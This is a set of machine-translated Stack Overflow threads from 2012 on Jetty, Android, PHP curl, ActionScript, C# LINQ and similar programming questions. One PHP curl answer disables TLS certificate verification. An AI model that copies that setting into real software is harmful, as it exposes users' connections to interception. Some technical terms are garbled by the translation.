        ws.onopen {
          puts "WebSocket connection open"

          # publish message to the client
          ws.send "Hello Client"
        }

        ws.onclose { puts "Connection closed" }
        ws.onmessage { |msg|
          puts "Recieved message: #{msg}"
          ws.send "Pong: #{msg}"
        }
    end
} 
```

有关更多信息，请参阅有关[ruby​​ 和 websocket](https://stackoverflow.com/questions/4767268/best-ruby-on-rails-websocket-tool)的另一个线程：

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-12T08:45:18.397

正如@intellidiot 所说，[node.js](http://nodejs.org/)可能是您正在寻找的库。

他们首页的代码示例将告诉您是否值得深入研究：

```
 /* 
  *     Here is an example of a simple TCP server 
  *     which listens on port 1337 
  *     and echoes whatever you send it: 
  */

var net = require('net');

var server = net.createServer(function (socket) {
  socket.write('Echo server\r\n');
  socket.pipe(socket);
});

server.listen(1337, '127.0.0.1'); 
```

查看他们的网站和文档。您也可以在此处查找[node.js。](/questions/tagged/node.js "显示标记为“node.js”的问题")

* * *

**编辑 ：**

当然，此示例演示了服务器功能，但您可以从中推断出涉及相同类型对象的客户端功能......

[这是来自socket.io-client README](https://github.com/LearnBoost/socket.io-client/blob/master/README.md)的代码示例（[socket.io-client](http://search.npmjs.org/#/socket.io-client)是一个 node.js 包）：

```
/*
 *    And now for the requested CLIENT code sample ;-)
 */

var socket = io.connect('http://domain.com');
socket.on('connect', function () {
    // socket connected
});
socket.on('custom event', function () {
    // server emitted a custom event
});
socket.on('disconnect', function () {
    // socket disconnected
});
socket.send('hi there'); 
```

希望这有助于澄清。抱歉，我的回答并不像一开始那么简单。

# maven-jetty-plugin - maven 的 eclipse jetty 插件 + 上下文部署器

> ID：10991430
> 
> 赞同：0
> 
> 时间：2012-06-12T06:19:50.997
> 
> 标签：maven-jetty-plugin

我正在开发一个 Java 应用程序，该应用程序目前在 jetty 版本 6(mortbay) 和 8(eclipse) 服务器中运行。

我发现维护项目有点忙，由于版本的不断升级，并且想添加在码头环境中运行的集成测试，所以我想将 maven 集成到其中。我已经从事过一个最初基于 maven 的项目。我已经能够将该项目转换为一个 Maven 项目，并且它似乎也可以完美运行。

唯一的问题是我需要为我的项目的一项功能实际添加上下文部署程序到 maven 的码头插件。我比较了 mortbay 的 jetty.xml 配置文件和 eclipse 的 jetty.xml，发现 mortbay 的版本包含上下文部署器，而那里没有上下文部署器的迹象，并且该配置在 jetty-contexts.xml 中指定。

我尝试更改 maven 和 jetty xml 配置以查看它是否有效。

这是我尝试过的事情的清单：

1.  在 pom.xml 中添加 jetty-contexts.xml 如下：

    ```
    <plugin>
       <groupId>org.mortbay.jetty</groupId>
       <artifactId>jetty-maven-plugin</artifactId>
       <version>8.1.0.RC5</version>
           <configuration>
                <jettyConfig>jetty.xml</jettyConfig>
                <jettyConfig>jetty-contexts.xml</jettyConfig> 
       </configuration>
    </plugin> 
    ```

    这给出了以下错误消息： 2012-06-12 11:04:15.182:WARN:oejx.XmlConfiguration:Config 错误 at java.lang.IllegalStateException: No object for id=DeploymentManager

2.  然后我尝试按如下方式更改 jetty.xml：

    我阅读了[http://wiki.eclipse.org/Jetty/Feature/ContextDeployer](http://wiki.eclipse.org/Jetty/Feature/ContextDeployer)并添加了以下配置：

    ```
    <Ref id="DeploymentManager">
        <Call name="addAppProvider">
            <Arg>
                <New class="org.eclipse.jetty.deploy.providers.ContextProvider">
                    <Set name="monitoredDir"><Property name="jetty.home" default="."/>/contexts</Set>
                    <Set name="scanInterval">1</Set>
                </New>
            </Arg>
        </Call>
    </Ref> 
    ```

    这给出了相同的错误消息：2012-06-12 11:04:15.182:WARN:oejx.XmlConfiguration:Config 错误在 java.lang.IllegalStateException: No object for id=DeploymentManager

    所以我将其更改为：

    ```
    <Call name="addAppProvider">
        <Arg>
            <New class="org.eclipse.jetty.deploy.providers.ContextProvider">
                <Set name="monitoredDir"><Property name="jetty.home" default="." />/contexts</Set>
                <Set name="scanInterval">1</Set>
            </New>
        </Arg>
    </Call> 
    ```

    这给了 java.lang.ClassNotFoundException: org.eclipse.jetty.deploy.providers.ContextProvider

    在上面的链接中，给出了“ContextProvider 机制，现在是核心部署基础设施的扩展，实现了这种能力”。所以我认为我必须为此功能包含一些插件。然后我遇到了
    [http://wiki.eclipse.org/Jetty/Feature/Jetty_Maven_Plugin#Using_GZip_Compression_and_Other_Jetty_Extensions](http://wiki.eclipse.org/Jetty/Feature/Jetty_Maven_Plugin#Using_GZip_Compression_and_Other_Jetty_Extensions)

    这让我想到了如何添加额外的扩展。然后我在 jetty-deploy jar 中找到了包含 ContextProvider 的 jar。

    然后在 pom.xml 中添加以下配置：

    ```
    <plugin>
        <groupId>org.mortbay.jetty</groupId>
    <artifactId>jetty-maven-plugin</artifactId>
    <version>8.1.0.RC5</version>
    <dependencies>
        <dependency>
        <groupId>org.eclipse.jetty</groupId>
        <artifactId>jetty-deploy</artifactId>
        <version>8.1.0.RC5</version>
    </dependency>
    </dependencies>
        ...
    </plugin> 
    ```

    这会出现以下错误：2012-06-12 13:38:53.375:WARN:oejx.XmlConfiguration:Config error at `<Call name="addAppProvider">`... No Method: `<Call name="addAppProvider">`on class org.mortbay.jetty.plugin.JettyServer

    深入研究 maven jetty 插件 jar，我发现 addLifeCycle 方法（已弃用），所以我添加了以下配置（就像在 jetty 6 上下文文件中写的一样）：

    ```
    <Call name="addLifeCycle">
        <Arg>
            <New id="hotdeployer" class="org.eclipse.jetty.deploy.providers.ContextProvider">
            <Set name="monitoredDir"><Property name="jetty.home" default="." />/contexts
                </Set>
            <Set name="scanInterval">1</Set>
            </New>
         </Arg> 
    ```

    之后 Maven jetty 插件开始运行。我在我的项目下创建了上下文文件夹并添加了一个上下文文件，码头抛出以下错误：

    java.lang.NullPointerException at org.eclipse.jetty.deploy.providers.ScanningAppProvider.fileAdded(ScanningAppProvider.java :142) at org.eclipse.jetty.deploy.providers.ScanningAppProvider$1.fileAdded(ScanningAppProvider.ja va:53) at org.eclipse.jetty.util.Scanner.reportAddition(Scanner.java:604) at org.eclipse.jetty.util.Scanner.reportDifferences(Scanner.java:535) at org.eclipse.jetty.util.Scanner.scan(扫描仪.java:398)

    查看源代码，第 142 行 `_deploymentManager.addApp(app);`表示部署管理器为空。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T06:19:14.017

我终于找到了答案。在 pom.xml 中，您必须添加：

```
 <plugin>

            <groupId>org.mortbay.jetty</groupId>
            <artifactId>jetty-maven-plugin</artifactId>
            <version>8.1.0.RC5</version>

            <dependencies>
                <dependency>
                    <groupId>org.eclipse.jetty</groupId>
                    <artifactId>jetty-deploy</artifactId>
                    <version>8.1.0.RC5</version>
                </dependency>
            </dependencies>

            <configuration>
                <webAppConfig>
                    <contextPath>XXXX</contextPath>
                </webAppConfig>
                <jettyConfig>jetty.xml</jettyConfig>
            </configuration>
     </plugin> 
```

在 jetty.xml 你必须添加：

```
 <Call name="addBean">
    <Arg><New id="DeploymentManager" class="org.eclipse.jetty.deploy.DeploymentManager"><Set name="contexts"><Ref id="Contexts" /></Set><Call name="setContextAttribute"><Arg>org.eclipse.jetty.server.webapp.ContainerIncludeJarPattern</Arg><Arg>.*/servlet-api-[^/]*\.jar$</Arg></Call></New></Arg></Call>

<Ref id="DeploymentManager"><Call name="addAppProvider"><Arg><New class="org.eclipse.jetty.deploy.providers.ContextProvider"><Set name="monitoredDirName"><Property name="jetty.home" default="." />/contexts</Set><Set name="scanInterval">1</Set></New></Arg></Call></Ref> 
```

注意空格，maven jetty插件抱怨jetty.xml配置中的空格

# actionscript-3 - Actionscript 3.0：点击目标有一个奇怪的问题

> ID：10991435
> 
> 赞同：2
> 
> 时间：2012-06-12T06:20:23.100
> 
> 标签：actionscript-3, mouseevent, parent, target

所以我在一个容器movieclip中生成了65个movieclip。（它在一个容器中，因为它在一个游戏中并且它在一个弹出窗口中。）通过访问库中的 AS3 链接的 MovieClip 来创建 MovieClip。每个都存储在一组 MovieClips 中。从那里我将一些文本信息（包括一些隐藏的文本）放入每个信息中，并添加一些事件侦听器。代码本身工作得很好，除了一件事。事件侦听器接收目标作为 MovieClip 内的 TextField 之一，而不是 MovieClip 本身。我绝对确定鼠标事件侦听器已应用于电影剪辑。

```
for (var i:int = 0; i < mcArray.length; i++)
{
    mcArray[i] = new IDButton();
    MovieClip(mcArray[i]).tf1.text = String(ID1[i])
    MovieClip(mcArray[i]).tf2.text = String(ID2[i]);
    MovieClip(mcArray[i]).tf3.text = String(ID3[i]);
    MovieClip(mcArray[i]).tf1.selectable = false;
    MovieClip(mcArray[i]).tf2.selectable = false;
    MovieClip(mcArray[i]).tf3.selectable = false;
    MovieClip(mcArray[i]).tf1.visible = false;
    MovieClip(mcArray[i]).tf2.visible = false;
    MovieClip(mcArray[i]).name = "MC" + String(i);
    container.addChild(MovieClip(mcArray[i]));
    MovieClip(mcArray[i]).addEventListener(MouseEvent.CLICK, mcClickHandler);
    MovieClip(mcArray[i]).addEventListener(MouseEvent.ROLL_OVER, mcHoverHandler);
    MovieClip(mcArray[i]).addEventListener(MouseEvent.ROLL_OUT, mcOffHandler);
    MovieClip(mcArray[i]).x = 0;
    MovieClip(mcArray[i]).y = MovieClip(mcArray[i]).height * i;
} 
```

（老实说，我不知道那里有 MovieClip 是否是多余的。我想这表明我对 Flash 普遍缺乏信任。）

所以为了测试，我在 mcClickHandler 函数中跟踪了目标名称，它一直返回“tf3”。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T06:25:39.893

AS3 中的事件有两个“目标”属性：`target`和`currentTarget`. 如果一个不工作，另一个通常会。

基本上，`target`是鼠标单击的实际对象，并且`currentTarget`是附加了侦听器的对象。

此 SO 问题中的更多信息：[Difference between e.target and e.currentTarget](https://stackoverflow.com/questions/5921413/difference-between-e-target-and-e-currenttarget)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:29:09.390

尝试将[mouseChildren](http://livedocs.adobe.com/livecycle/es/sdkHelp/common/langref/flash/display/DisplayObjectContainer.html#mouseChildren)设置为`false`：

```
MovieClip(mcArray[i]).mouseChildren = false; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T10:45:15.130

我会选择更简单的版本；仅添加*一个*事件侦听器并用于`Event.target`确定单击了哪个项目（在容器内）。您可以巧妙地利用它的类型（类）。假设你所有的按钮都扩展了一个名为 的自定义类`IDButton`，它们都需要做同样的事情（比如调用一个函数），但是使用一个基于它的 id 的参数。

如果按钮基本上应该做同样的事情，并且在同一个容器中没有很多其他类型的剪辑需要监听相同的鼠标事件，这将很有帮助。

```
package  
{
    import flash.display.Sprite;
    import flash.events.MouseEvent;

    public class Test extends Sprite
    {
        public function Test()
        {
            // one listener for all clicks
            this.addEventListener(MouseEvent.CLICK, handleClick);
            this.addEventListener(MouseEvent.MOUSE_OVER, handleHover);
            this.addEventListener(MouseEvent.MOUSE_OUT, handleHover);
        }

        private function handleClick(event:MouseEvent):void
        {
            // you're need to be sure it's a IDButton
            if (event.target is IDButton)
            {
                var button:IDButton= event.target as IDButton; 
                this.showById(button.id); // let's say CustomButton has a public var 'id'
            }
        }

        private function showById(id:int):void
        {
            // do something
        }

        private function handleHover(event:Event):void
        {
            if (event.target is IDButton)
            {
                var button:IDButton = event.target as IDButton;
                switch (event.type)
                {
                    case MouseEvent.ROLL_OVER:
                    {
                        button.alpha = 0.8;
                        break;
                    }
                    case MouseEvent.ROLL_OUT:
                    {
                        button.alpha = 1;
                        break;
                    }
                }
            }
        }
    }
} 
```

希望有帮助。

# android - Android LicenseChecker 上的“无法绑定到服务”

> ID：10991437
> 
> 赞同：2
> 
> 时间：2012-06-12T06:20:30.693
> 
> 标签：android, android-emulator, android-lvl

我正在尝试实施 Android 许可证。一切都按照指示做了。但是当由于未经许可使用而需要关闭应用程序时。我得到例外：

```
06-12 09:11:31.384: E/LicenseChecker(383): Could not bind to service.
06-12 09:11:36.884: E/ActivityThread(383): Activity com.myapp.main.mactivity has leaked ServiceConnection com.google.android.vending.licensing.LicenseChecker@406a4428 that was originally bound here
06-12 09:11:36.884: E/ActivityThread(383): android.app.ServiceConnectionLeaked: Activity com.myapp.main.mactivity has leaked ServiceConnection com.google.android.vending.licensing.LicenseChecker@406a4428 that was originally bound here
06-12 09:11:36.884: E/ActivityThread(383):  at android.app.LoadedApk$ServiceDispatcher.<init>(LoadedApk.java:932)
06-12 09:11:36.884: E/ActivityThread(383):  at android.app.LoadedApk.getServiceDispatcher(LoadedApk.java:827)
06-12 09:11:36.884: E/ActivityThread(383):  at android.app.ContextImpl.bindService(ContextImpl.java:1082)
06-12 09:11:36.884: E/ActivityThread(383):  at android.content.ContextWrapper.bindService(ContextWrapper.java:370)
06-12 09:11:36.884: E/ActivityThread(383):  at com.google.android.vending.licensing.LicenseChecker.checkAccess(LicenseChecker.java:150) 
```

什么可能导致这种情况？

我创建的 onCreate 方法：

```
mHandler = new Handler();

// Try to use more data here. ANDROID_ID is a single point of attack.
String deviceId = Secure.getString(getContentResolver(), Secure.ANDROID_ID);

// Library calls this when it's done.
mLicenseCheckerCallback = new MyLicenseCheckerCallback();
// Construct the LicenseChecker with a policy.
mChecker = new LicenseChecker(
    this, new ServerManagedPolicy(this,
        new AESObfuscator(SALT, getPackageName(), deviceId)),
    BASE64_PUBLIC_KEY);
doCheck(); 
```

和 onDestroy：

```
@Override
protected void onDestroy() {
    super.onDestroy();
    mChecker.onDestroy();
} 
```

那么这个例外到底意味着什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-28T04:38:53.913

我也遇到了这个。我正在使用 4.0.4 的 AVD Galaxy Nexus 进行测试。

我尝试了其他线程的建议来使用 getApplicationContext() 而不是使用当前活动的上下文。但这并没有帮助。

切换到真实设备确实解决了评论中提到的问题。

另一个可能有效的选项如下：

1.  使用基于 Google API 的模拟器（在 AVD 管理器中配置）。
2.  在“设置”中将 Google 帐户添加到模拟器。
3.  验证上述帐户是否在 Play 商店开发控制台中的 Android 许可测试人员列表中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-20T21:54:23.530

如果您使用的是模拟器而不是设备：

1.  确保您的模拟器在 Google API 上运行，而不是在 Android API 上运行。您可以在虚拟设备管理器中进行设置
2.  一旦您的模拟器在正确的 API 上运行，打开模拟器，然后转到设置 -> 添加帐户并使用您的 Gmail 测试帐户登录（您应该在 Google Play 中设置相同的帐户以获得正确的许可证响应）
3.  登录后，运行您的应用程序，它应该可以在模拟器上正常运行

基本问题是当您尝试在模拟器上运行应用程序时，您没有登录到有效的测试帐户。

# c++ - 使用 CreateFont() 创建时，Tahoma (MS Shell Dlg 2) 字体在 Win7 中看起来被压扁了

> ID：10991441
> 
> 赞同：1
> 
> 时间：2012-06-12T06:20:42.193
> 
> 标签：c++, winapi, windows-7, fonts

我正在尝试在 Listview 控件中使用高度为 -15 和/或高度为 -12 的 Tahoma 字体（MS Shell Dlg 2）。然而，对于这两种尺寸，我的文本似乎水平挤压在一起，即 l 和 i 靠得很近，以至于几乎无法区分它们。默认高度为 -13 或 -16 看起来不错。

我想知道我对 CreateFont 的调用是否有问题，如下所示，或者这是否是字体的限制？

```
CreateFont(-15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,    
    OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, 
    DEFAULT_PITCH | FF_DONTCARE, L"MS Shell Dlg 2"); 
```

我尝试使用质量和输出精度参数，但没有运气。

* * *

## 回答 #1

> 赞同：-3
> 
> 时间：2012-10-25T03:51:14.617

这是另一个论坛上的人回答的。显然，某个版本的 Tahoma 字体存在错误。

# android - Android中无需互联网的语音识别

> ID：10991442
> 
> 赞同：8
> 
> 时间：2012-06-12T06:20:46.380
> 
> 标签：android, voice-recognition

我一直在寻找几个支持 android 的语音识别库，但它们都没有服务器调用或不使用互联网的功能。我的要求是在没有互联网的情况下检测一些特定的关键字并相应地执行一些操作，即关键字分析应该在本地完成。那么是否有任何语音识别库能够做到这一点。[CMU Sphinx](http://cmusphinx.sourceforge.net/)是人们说可以实现这一目标的唯一工具包，但它仍然需要一种算法来识别语音中的关键字。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T09:14:39.750

您可以将[Pocketsphinx](http://cmusphinx.sourceforge.net/2011/05/building-pocketsphinx-on-android/)与统计模型一起使用，您可以在语料库上进行训练，以反映用户可能与您的应用程序交谈的语言，或者您可以定义一个 JSGF 语法，将语言明确定义为一组上下文无关规则. 在这两种情况下，您都需要有声学模型和音标到拼字词的映射。CMU Sphinx 项目为英语和其他几种语言提供这些资源。

一旦语音被识别，它就会变成一个简单的字符串，您可以应用任何您希望应用的“找出关键字”算法。

[Inimesed 是使用基于 JSGF 的语音识别的基于Pocketsphinx](http://kaljurand.github.com/Inimesed/)的 Android 应用程序的一个示例。

# php - curl 获取远程文件并同时强制下载

> ID：10991443
> 
> 赞同：7
> 
> 时间：2012-06-12T06:21:10.620
> 
> 标签：php, curl

我正在尝试获取远程文件并同时强制将其下载给用户。无法粘贴代码，代码太长。但是 curl 功能可以工作，但问题是它不会输出任何内容，直到它首先获取远程文件然后强制将其下载给用户。

我用它来告诉 curl 返回一个回调

```
curl_setopt($ch, CURLOPT_READFUNCTION, 'readCallback'); 
```

现在在我的 readCallback 函数中我这样做：

```
function readCallback($curl, $stream, $maxRead){
    $read = fgets($stream, $maxRead);
    echo $read;
    return $read;
} 
```

但它不会返回任何内容，它只是等待获取远程文件完成。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T08:36:21.407

试试这个，它会使用 curl 来获取文件的总大小，然后下载文件的部分块代理它给用户，所以没有*等待*curl 先下载它，我用 avi,mp4,mp3 测试了这个和一个exe，希望它有帮助：

```
<?php
$file = 'http://example.com/somefile.mp3';
download($file,2000);

/*
Set Headers
Get total size of file
Then loop through the total size incrementing a chunck size
*/
function download($file,$chunks){
    set_time_limit(0);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-disposition: attachment; filename='.basename($file));
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Expires: 0');
    header('Pragma: public');
    $size = get_size($file);
    header('Content-Length: '.$size);

    $i = 0;
    while($i<=$size){
        //Output the chunk
        get_chunk($file,(($i==0)?$i:$i+1),((($i+$chunks)>$size)?$size:$i+$chunks));
        $i = ($i+$chunks);
    }

}

//Callback function for CURLOPT_WRITEFUNCTION, This is what prints the chunk
function chunk($ch, $str) {
    print($str);
    return strlen($str);
}

//Function to get a range of bytes from the remote file
function get_chunk($file,$start,$end){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $file);
    curl_setopt($ch, CURLOPT_RANGE, $start.'-'.$end);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($ch, CURLOPT_WRITEFUNCTION, 'chunk');
    $result = curl_exec($ch);
    curl_close($ch);
}

//Get total size of file
function get_size($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_exec($ch);
    $size = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
    return intval($size);
}
?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:48:59.833

尝试像这样使用 curl：

```
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$result = curl_exec($ch);

$msg = new HttpMessage($result);
return $msg->getBody(); 
```

然后返回值是请求文件的内容，然后您可以将其输出。所以不需要回调。[HTTPMessage 文档](http://de2.php.net/manual/en/class.httpmessage.php)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-06T20:58:31.787

如何获取**大**（8GB）远程文件并同时强制下载，同时不杀死你的服务器：

```
<?php

$url = 'http://www.example.com/bigfile.mp4';

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($url).'"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');

readfile($url); 
```

[readfile()](https://www.php.net/manual/en/function.readfile.php)函数将分块读取流，并将其打印到输出，因此它不会使用太多内存...

# cocos2d-iphone - Cocos2d 基于时间的动画和基于帧的动画混淆？

> ID：10991445
> 
> 赞同：0
> 
> 时间：2012-06-12T06:21:16.263
> 
> 标签：cocos2d-iphone

Cocos2d-android - 我有一个有 5 帧的动画，它们是近距离裁剪的图像。现在我想让 Sprite 做动画以及沿 X 方向移动。即我有一个正在运行的玩家与障碍物相撞并摔倒。

```
gameOverAnimation =CCSprite.sprite("gmovr")
gameOverAnimation.setAnchorPoint(0, 0);
gameOverAnimation.setPosition(340.0f, 200.0f);
addChild(gameOverAnimation,10);
CCIntervalAction action1 = CCAnimate.action(mEndAnimation, false); 
action1.setDuration(1.0f);
CCIntervalAction delay = CCDelayTime.action(0.68f);
CCMoveBy actionBy = CCMoveBy.action(1.0f, CGPoint.ccp(-340,0)); 
CCIntervalAction seq1 = CCSpawn.actions(action1,actionBy);
//CCSpawn spawn = CCSpawn.actions(action1, actionBy);
                CCSequence sequence1 = CCSequence.actions(seq1,CCCallFuncN.action(this,"gameOver"));
                gameOverAnimation.runAction(sequence1); 
```

请一些人解释一下**基于帧和基于时间的动画**之间的正确区别。我想做基于时间的动画

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T10:45:08.033

在基于帧的动画下是什么意思？cocos2d引擎中几乎所有的动作都分为2组。即时和间歇动作。即时动作是连续动作。使用帧的 CCAnimate 动作是 CCActionInterval 的子类，因此它是“基于时间”的动作

# salesforce - 使用 REST API 获取 Salesforce 对象的可访问字段

> ID：10991446
> 
> 赞同：2
> 
> 时间：2012-06-12T06:21:18.437
> 
> 标签：salesforce, apex-code, force.com

我有一个 SOSL 查询，我在其中搜索联系人和潜在客户 SObject 中的电子邮件地址。我指示查询返回一些字段，如 FirstName、MobilePhone 等，现在，如果我的 SF 组织没有 MobilePhone 字段可见性为 true，则查询返回“Invalid Column MobilePhone”。

有没有一种方法可以在触发查询之前*使用 Force.com REST API*获取给定对象的可用字段？

我的 SOSL 查询是

```
FIND {test@er.com} IN EMAIL FIELDS RETURNING Contact(Phone, Id, Department, Email, isDeleted, Name, MailingCity, Title ), Lead(Id, City, Company, Country, Name, MobilePhone, Phone, State, Status, Street, Title) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T07:03:34.797

您可以使用[SObject Describe 功能](http://www.salesforce.com/us/developer/docs/api_rest/Content/resources_sobject_describe.htm)或 REST API 等效功能（/services/data/v24.0/sobject/[SObject]/describe [REST API Describe call](http://www.salesforce.com/us/developer/docs/api_rest/Content/resources_sobject_describe.htm) ）找到所需的信息。如果诸如 MobilePhone 之类的字段不在 REST describe 调用返回的子“字段”列表中，则它不可访问。因此，如果您有一个想要返回的字段列表，您应该检查它们是否在“字段”列表中返回，如果它们不存在，则不要将它们包含在您的 SOSL 查询中。

# android - 写入时读取parcelable不起作用

> ID：10991449
> 
> 赞同：1
> 
> 时间：2012-06-12T06:21:37.860
> 
> 标签：android, android-intent, parcelable

我使用parecable将数据从一个服务发送到另一个服务，当我写入数据时包含正确的值，但是当从parcelable读取数据时它返回空值。

谁能告诉我这段代码有什么问题？

可打包类

```
package com.airwatch.agent.finddevice;

import android.os.Parcel;
import android.os.Parcelable;

/**
 * Represents the configuration supplied from device services 
 * regarding the  find device command.
 */
public class FindDeviceConfig implements Parcelable{
    public FindDeviceConfig() {
    }

    /**
     * number of loops to play ring-tone.
     */
    private String numberoftime;

    /**
     * Delay between loops - in seconds.
     */
    private String interval;

    public FindDeviceConfig(String numberoftime, String interval) {
        this.numberoftime = numberoftime;
        this.interval = interval;
    }

    public String getNumberoftime() {
        return numberoftime;
    }

    public void setNumberoftime(String numberoftime) {
        this.numberoftime = numberoftime;
    }

    public String getInterval() {
        return interval;
    }

    public void setInterval(String interval) {
        this.interval = interval;
    }

    public int describeContents() {
        return 0;
    }

    public void writeToParcel(Parcel dest, int flags) {
        //dest.writeInt(Integer.parseInt(numberoftime));

        //dest.writeInt(Integer.parseInt(interval));
        dest.writeString(this.interval);
        dest.writeString(this.numberoftime);
    }

    public static final Parcelable.Creator<FindDeviceConfig> CREATOR = new Parcelable.Creator<FindDeviceConfig>() {
        public FindDeviceConfig createFromParcel(Parcel in) {
            return new FindDeviceConfig(in);
        }

        public FindDeviceConfig[] newArray(int size) {
            return new FindDeviceConfig[size];
        }
    };

    public FindDeviceConfig(Parcel parcel)
    {
        parcel.setDataPosition(0);

        interval=parcel.readString();
        numberoftime=parcel.readString();

    }
} 
```

放置可包裹的对象。

```
FindDeviceConfig config=new FindDeviceConfig("3","2");
intent.putExtra("finddevice_config", config); 
```

读取可包裹对象。

```
FindDeviceConfig config = intent.getParcelableExtra("finddevice_config"); 
```

有人遇到过这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:07:31.167

添加以下构造函数：

```
public FindDeviceConfig(Parcel data) {
    this.numberoftime  = data.readString();
    this.interval = data.readString();
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-05T19:18:06.040

我有同样的问题，但有不同的解决方案，所以在这里发布以供将来参考。

使用时要记住的最重要的事情`Parcelable`是，将变量写入 Parcel 的顺序也应该是读取它的顺序。

例如，

```
//wirting to Parcel
public void writeToParcel(Parcel dest, int flags) {       
    dest.writeString(this.interval); //interval first
    dest.writeString(this.numberoftime); //numberoftime second
} 

//reading from Parcel 
public FindDeviceConfig(Parcel parcel)
{  
    Wrong order -- this will not work or give unwanted result

    numberoftime=parcel.readString(); 
    interval=parcel.readString();
} 

//Correct Order
public FindDeviceConfig(Parcel parcel)
{           
    interval=parcel.readString(); //interval first
    numberoftime=parcel.readString(); //numberoftime second
} 
```

快乐编码:)

# python - python 未处理的异常

> ID：10991450
> 
> 赞同：0
> 
> 时间：2012-06-12T06:21:41.710
> 
> 标签：python, scripting, xml-parsing

我正在使用**MODO** python 脚本。我将 MODO 设置数据导入到**XML 格式的****.cfg** 文件中。

 **我的 .cfg 文件如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
  <camera>
     <Position>
       <X>
        2.0
       </X>
       <Y>
        0.75
       </Y>
       <Z>
        4.0
       </Z>
     </Position>
               "
               "
           so on...... 
```

现在，我想把这个文件导出到我的**MODO**应用程序中。所以，我需要解析这个。**cfg**文件（xml 格式）。

我试过这个：

```
#python

 import lx

 import xml.dom.minidom
 from xml.dom.minidom import Node
 dom1 = xml.dom.minidom.parse("c:\myfile.cfg") 
```

当我尝试在我的 MODO 应用程序中运行此脚本时，它给了我以下错误：

![在此处输入图像描述](../Images/821bc15c1502b5c34969ccfd4c35ba39.png)

第 26 行是`dom1 = xml.dom.minidom.parse("c:\myfile.cfg")`

如何在**python中使用****minidom**对象解析我的 .cfg 文件与 xml 格式？提前谢谢。

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:25:14.740

[Python mindom 文档页面](http://docs.python.org/library/xml.dom.minidom.html)上有一个非常好的示例，您也可以考虑使用更易于编写的 JSON，或将 Python 对象序列化为 JSON。****

# c# - 如何在 C# 中获取两个字符串数组之间的差异？

> ID：10991452
> 
> 赞同：24
> 
> 时间：2012-06-12T06:22:00.870
> 
> 标签：c#, .net, arrays, linq

如何使用 C#.net 比较两个数组字符串？例如：

```
string[] com1 = { "COM6", "COM7" };
string[] com2 = { "COM6", "COM7","COM8" }; 
```

这里 com1 和 com2 是数组字符串。结果：COM8。如何做到这一点？

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2012-06-12T06:26:12.120

听起来你想要除了里面的东西`array2` *之外*的所有东西`array1`：

```
var onlyInArray2 = array2.Except(array1); 
```

当然，如果您*还想*知道仅在`array1`您可以使用的内容：

```
var onlyInArray1 = array1.Except(array2); 
```

（这都需要 .NET 3.5 或更高版本，或替代 LINQ to Objects 实现，例如 LINQBridge。）

我假设在计算差异时顺序并不重要 -`Except`是基于集合的运算符，因此假设您将集合视为集合。

请注意，`Except`只返回一个`IEnumerable<T>`- 如果您希望将结果作为数组，您需要调用`ToArray`：

```
var onlyInArray2 = array2.Except(array1).ToArray();
var onlyInArray1 = array1.Except(array2).ToArray(); 
```

如果您想要对称差异，即您只关心单个数组中的哪些值，而不是它们来自哪个数组，您可以使用：

```
var onlyInOneArray = array1.Union(array2).Except(array1.Intersect(array2)); 
```

或者你可以`HashSet`直接使用：

```
var set = new HashSet<string>(array1);
// This modifies the set...
set.SymmetricExceptWith(array2); 
```

在所有这些中，结果顺序是未定义的，尽管在实践`Except`中将保留第一个参数的原始顺序。虽然严格来说这是一个实现细节，但我认为它不太可能改变。

与 LINQ 中的其他基于集合的运算符一样，它`Except`只会返回任何元素一次 - 所以如果`COM8`在 中出现两次`array2`，它只会在结果中出现一次。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-06-12T06:24:29.033

使用 Linq[除外扩展](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.except.aspx)：

```
IEnumerable<string> result = com2.Except(com1); 
// result: { "COM8" } 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-06-12T06:25:20.937

